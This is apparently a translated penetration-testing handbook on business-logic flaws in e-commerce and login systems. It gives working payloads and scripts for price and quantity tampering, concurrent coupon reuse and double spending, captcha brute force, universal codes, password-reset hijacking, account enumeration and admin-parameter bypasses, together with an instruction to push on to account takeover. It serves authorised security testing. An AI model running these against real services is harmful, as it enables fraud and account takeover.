> What is written is governed only by `../rules/report-format.md`. With a session, the minimum probes for engagement are in `../rules/engagement-guide.md` §4.2.3 (add fields, skip steps, one-shot concurrency on claim / stock / coupon). This module is test methods: test payment / flow / captcha alike; if sending codes or solving the slider did not get you into an account, hand off to the authentication chain, do not stop halfway.
> Shortlist entry "Merchant promo binding" lives in §1.4. The English business-logic / CHECKLIST / METHODOLOGY / SCENARIOS attachments have been cut; the payment / flow / captcha test methods stay in the top half.

---

## Part I: Original Knowledge Base

# Business Logic Vulnerability Testing Handbook

## 1. Payment Logic Vulnerabilities

### 1.1 Price Tampering

```bash
# At cart checkout, tamper with the unit price
# Capture the order-submit request and modify the price field
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # original price changed to 0.01

# Negative price (balance increases)
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 Quantity Tampering

```bash
# Buy 1 item but change the request to -1 (possible refund)
{"goodsId": "123", "count": -1, "price": "99.00"}

# Integer overflow (32-bit maximum)
{"count": 2147483647}
```

### 1.3 Coupon / Points Vulnerabilities

```bash
# Reuse the same coupon
# Concurrency race (submit the same coupon from multiple threads at once)
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# Negative points (set a negative value when redeeming points)
{"points": -1000}  # expect the balance to increase
```

### 1.4 Merchant Promo Binding: Hang Your Coupon on Someone Else's Goods (Shortlist Pointer)

> Essence: the merchant backend "bind my promo/coupon to some product" trusts only the `productId` in the request and never checks whether that product belongs to the store.  
> This is **not the same thing** as editing price at checkout, raising the coupon face value, or swapping to a cheaper SKU at checkout. One shortlist row points to this section.

**Recognize:** there is a merchant / supplier backend; you can create flat discounts, no-threshold coupons, and promos; binding endpoints usually carry `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`; the body carries both a coupon/activity ID and `productId` / `skuId` / `goodsId`.

**Attack:**

1. With your own store account, create a brutally strong coupon (no threshold, big enough face value, not limited to your own category is even better)  
2. Bind it to one of your own products normally and capture the binding request  
3. **Only change** `productId` (or the synonym field) to a product in another store / category; leave the coupon ID / activity ID untouched  
4. Without logging in, open that product's detail / checkout page on the C side and check the marked price and amount due

**Counts as:** the C-side amount due for that other store's product drops because of your coupon (being able to actually order is even better). Proving only that the binding endpoint returned 200, or that the merchant-backend list gained a row → does not count; the C-side price must actually change.

**False positives:** the binding succeeds but the C-side price/settlement stays unchanged; the backend rewrites the product by merchant session so only your own goods can be bound; what you changed was the `productId` inside the C-side checkout payload to a cheaper SKU (that is the already-listed "swap product at checkout", not this entry).

Don't mix it up with neighboring techniques:

| This entry | Don't mistake it for |
|------|--------|
| B-side coupon-binding endpoint; you change "which product it binds to" | C-side checkout tampering with `amount` / `coupon_amount` |
| Your coupon + someone else's `productId` | Swapping `productId` for a cheaper SKU at checkout and then paying |
| Must see the C-side price actually drop | The merchant-backend list showing "bound successfully" is enough |

Opening half-minute probe: with a merchant backend, create a coupon → capture the binding request → swap in a `productId` that is clearly not from your store → open the C side and look at the price.

---

## 2. Captcha / SMS Vulnerabilities

> Only a takeover / privilege-escalation closed loop (code echo + login, universal code + login, brute force + password change) counts as a break-through. If only sending was triggered / the slider passed / you could try codes but did not enter an account → hand off to the authentication chain, do not stop halfway.

### 2.1 Enumerable Captcha Code

```python
import requests

# 4-digit numeric captcha - try them one by one
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"Correct captcha: {code:04d}")
        break

# Verify: is there rate limiting? (first 20 attempts unlimited -> no account access yet; keep following the auth chain)
```

### 2.2 Universal Captcha Code

```
Test the following codes:
000000, 123456, 888888, 666666
111111, 999999
Empty value: ""
Submit without sending any captcha
```

### 2.3 SMS Bombing (Test Rate Limits Lightly, Don't Stop Halfway)

> Proving only that codes can be sent does not count as a break-through. The technical points below keep you from mistaking the bombing endpoint for the main bug.

```python
# Test whether sending is rate-limited (only test 1-2 times, do not actually bomb)
# Verify:
# 1. Whether consecutive sends to the same number are interval-limited
# 2. Whether an IP limit exists
# 3. Modify the phone parameter but messages still go to the fixed number
{"phone": "target phone", "realPhone": "13800138000"}
```

---

## 3. Race Condition

### 3.1 Concurrent Deduction

```python
import threading
import requests

# Balance 100, fire 10 concurrent 100-yuan spends
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 Duplicate Submission

```bash
# Duplicate order submission (send the same request multiple times)
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## 4. Account Security Vulnerabilities

### 4.1 Account Enumeration

```bash
# Register/login endpoints distinguish "user does not exist" from "wrong password"
# If the responses differ -> accounts can be enumerated

# Register-time check whether the phone number is already registered
curl "https://target.com/api/register/check?phone=13800138000"
# Response {"exists": true} -> enumerable
```

### 4.2 Password Recovery Logic

```
Test flow:
1. Initiate a password reset (phone A)
2. Obtain the token/link
3. Change the phone in the request to phone B
4. If B's password gets reset successfully -> arbitrary account password reset
```

### 4.3 Takeover Vulnerabilities

```
Scenario: a phone number is de-registered and later reassigned to someone else
1. Register with the de-registered number
2. Try to log into the account originally bound to it
3. Or: when changing the bound phone number, the captcha is sent to the old number
```

---

## 5. Business Logic Bypass

### 5.1 State-Machine Bypass

```bash
# Normal flow: step 1 -> step 2 -> step 3 -> done
# Try skipping step 2 and going straight to step 3
# Or step back to step 1 while keeping step 3's result

# Record the request of each step, replay them one by one, and see whether validation can be jumped
```

### 5.2 Test-Only Parameters

```
Add to requests:
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---
